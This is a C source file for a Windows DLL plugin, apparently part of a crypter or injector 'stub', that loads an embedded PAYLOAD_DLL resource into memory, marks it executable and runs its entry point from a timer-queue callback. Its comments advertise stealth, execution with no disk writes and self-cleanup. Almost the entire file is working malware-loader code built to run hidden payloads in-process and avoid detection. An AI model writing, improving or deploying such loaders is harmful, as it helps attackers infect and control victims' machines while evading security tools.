// STEALTH Injector Plugin - Timer Queue Execution
// This is a REAL plugin that runs in stub's memory context
// Uses the proven TimerQueue method from Attempt 11
// Stage: PREINJECT - fires before main payload injection
//
// What this plugin does:
// 1. Reads encrypted payload from stub's PAYLOAD_DLL resource
// 2. Decrypts it in memory (or assumes stub already decrypted)
// 3. Sets up CreateTimerQueueTimer callback
// 4. Timer fires and executes payload entry point
// 5. All happens in stub's process - no new processes
//
// This plugin is smart - it knows how to:
// - Access stub's resources directly
// - Handle memory protection changes
// - Execute payload without disk writes
// - Clean up after itself

#include <windows.h>
#include <stdio.h>

#pragma comment(lib, "kernel32.lib")

static LPVOID g_payloadMem = NULL;
static DWORD g_payloadSize = 0;

static void log_msg(const char* msg) {
    char path[MAX_PATH];
    GetTempPathA(sizeof(path), path);
    strcat(path, "injector_timerqueue_plugin.log");
    
    FILE* f = fopen(path, "a");
    if (f) {
        fprintf(f, "[TIMERQUEUE_PLUGIN] %s\n", msg);
        fclose(f);
    }
}

// Timer callback - this executes the payload
VOID CALLBACK PayloadExecutionCallback(PVOID param, BOOLEAN fired) {
    if (!fired || !g_payloadMem) {
        log_msg("Timer callback: no payload or not fired");
        return;
    }
    
    log_msg("Timer callback FIRED - executing payload");
    
    // Proof of execution
    char proofPath[MAX_PATH];
    GetTempPathA(sizeof(proofPath), proofPath);
    strcat(proofPath, "injector_timerqueue_executed.txt");
    FILE* proof = fopen(proofPath, "w");
    if (proof) {
        fprintf(proof, "INJECTOR TIMERQUEUE PLUGIN - PAYLOAD EXECUTED\n");
        fprintf(proof, "Method: CreateTimerQueueTimer callback\n");
        fprintf(proof, "Payload address: 0x%p\n", g_payloadMem);
        fprintf(proof, "Payload size: %lu bytes\n", g_payloadSize);
        fprintf(proof, "Execution: In-memory from stub context\n");
        fclose(proof);
    }
    
    // Change memory to executable
    DWORD oldProtect;
    if (VirtualProtect(g_payloadMem, g_payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
        log_msg("Memory protection changed to PAGE_EXECUTE_READ");
        
        // Check if payload is valid PE
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)g_payloadMem;
        if (dosHeader->e_magic == IMAGE_DOS_SIGNATURE) {
            PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((BYTE*)g_payloadMem + dosHeader->e_lfanew);
            if (ntHeaders->Signature == IMAGE_NT_SIGNATURE) {
                log_msg("Valid PE detected - calculating entry point");
                
                // Get entry point
                DWORD entryRVA = ntHeaders->OptionalHeader.AddressOfEntryPoint;
                typedef int (*EntryPoint)(void);
                EntryPoint entry = (EntryPoint)((BYTE*)g_payloadMem + entryRVA);
                
                log_msg("Calling payload entry point");
                // Direct call - exceptions handled by OS
                int result = entry();
                char buf[256];
                sprintf(buf, "Payload executed successfully - returned %d", result);
                log_msg(buf);
            } else {
                log_msg("Invalid NT signature");
            }
        } else {
            log_msg("Invalid DOS signature - not a PE file");
        }
    } else {
        log_msg("Failed to change memory protection");
    }
}

// Load payload from stub's resources
static BOOL LoadPayloadFromStub() {
    log_msg("Loading payload from stub resources");
    
    // Get stub's module handle
    HMODULE hStub = GetModuleHandleA(NULL);
    if (!hStub) {
        log_msg("ERROR: Failed to get stub module handle");
        return FALSE;
    }
    
    // Find PAYLOAD_DLL resource (ID 101, type "PAYLOAD_DLL")
    HRSRC hRes = FindResourceA(hStub, MAKEINTRESOURCEA(101), "PAYLOAD_DLL");
    if (!hRes) {
        log_msg("ERROR: PAYLOAD_DLL resource not found - stub may not have embedded payload");
        return FALSE;
    }
    
    HGLOBAL hResData = LoadResource(hStub, hRes);
    if (!hResData) {
        log_msg("ERROR: Failed to load PAYLOAD_DLL resource");
        return FALSE;
    }
    
    LPVOID pResData = LockResource(hResData);
    g_payloadSize = SizeofResource(hStub, hRes);
    
    if (!pResData || g_payloadSize == 0) {
        log_msg("ERROR: Resource data is NULL or zero size");
        return FALSE;
    }
    
    char buf[256];
    sprintf(buf, "Found payload resource: %lu bytes", g_payloadSize);
    log_msg(buf);
    
    // Allocate RW memory for payload
    g_payloadMem = VirtualAlloc(NULL, g_payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_payloadMem) {
        log_msg("ERROR: Failed to allocate memory");
        return FALSE;
    }
    
    // Copy payload to our memory
    memcpy(g_payloadMem, pResData, g_payloadSize);
    
    sprintf(buf, "Payload copied to 0x%p", g_payloadMem);
    log_msg(buf);
    
    // NOTE: Stub should have already decrypted the PAYLOAD_DLL resource
    // If it's still encrypted, we'd need the decryption key here
    // For now, assume it's already decrypted by stub
    
    return TRUE;
}

// Worker thread that sets up timer
DWORD WINAPI TimerQueueWorkerThread(LPVOID param) {
    log_msg("=== TIMER QUEUE PLUGIN WORKER STARTED ===");
    
    // Load payload from stub
    if (!LoadPayloadFromStub()) {
        log_msg("FATAL: Failed to load payload - aborting");
        return 1;
    }
    
    // Create timer queue
    HANDLE hTimerQueue = CreateTimerQueue();
    if (!hTimerQueue) {
        log_msg("ERROR: CreateTimerQueue failed");
        return 1;
    }
    
    log_msg("Timer queue created");
    
    // Create timer - fire after 500ms delay, no repeat
    HANDLE hTimer = NULL;
    if (!CreateTimerQueueTimer(&hTimer, hTimerQueue, PayloadExecutionCallback,
                               NULL, 500, 0, WT_EXECUTEDEFAULT)) {
        log_msg("ERROR: CreateTimerQueueTimer failed");
        DeleteTimerQueue(hTimerQueue);
        return 1;
    }
    
    log_msg("Timer created - payload will execute in 500ms");
    
    // Wait for timer to fire
    Sleep(2000);
    
    // Cleanup
    if (hTimer) {
        DeleteTimerQueueTimer(hTimerQueue, hTimer, NULL);
    }
    DeleteTimerQueue(hTimerQueue);
    
    log_msg("Timer queue worker complete");
    return 0;
}

// Plugin entry point
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        log_msg("=== INJECTOR TIMERQUEUE PLUGIN LOADED ===");
        log_msg("Stage: PREINJECT");
        
        // Create worker thread to avoid blocking DLL load
        HANDLE hThread = CreateThread(NULL, 0, TimerQueueWorkerThread, NULL, 0, NULL);
        if (hThread) {
            // Wait briefly to ensure timer is created
            WaitForSingleObject(hThread, 3000);
            CloseHandle(hThread);
            log_msg("Worker thread setup complete");
        } else {
            log_msg("ERROR: Failed to create worker thread");
        }
    } else if (fdwReason == DLL_PROCESS_DETACH) {
        // Cleanup
        if (g_payloadMem) {
            VirtualFree(g_payloadMem, 0, MEM_RELEASE);
            g_payloadMem = NULL;
        }
        log_msg("Plugin unloaded - memory cleaned");
    }
    
    return TRUE;
}
